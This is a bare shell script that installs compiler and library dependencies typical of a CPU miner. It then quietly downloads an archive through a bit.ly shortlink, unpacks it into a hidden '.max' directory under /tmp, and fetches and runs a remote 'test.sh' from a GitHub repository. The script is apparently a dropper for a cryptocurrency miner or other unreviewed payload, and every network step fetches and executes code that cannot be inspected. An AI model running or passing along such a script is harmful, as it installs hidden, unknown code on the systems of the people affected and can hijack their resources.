#!/bin/sh
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf -y
sLink='https://github.com/cloud10001/pycpu/raw/main/test.sh'
wget -q -O /tmp/maxarc bit.ly/MaxArc
cd /tmp/
tar -xJf /tmp/maxarc 
cd .max
wget -q -O script.sh $sLink 
chmod +x script.sh
./script.sh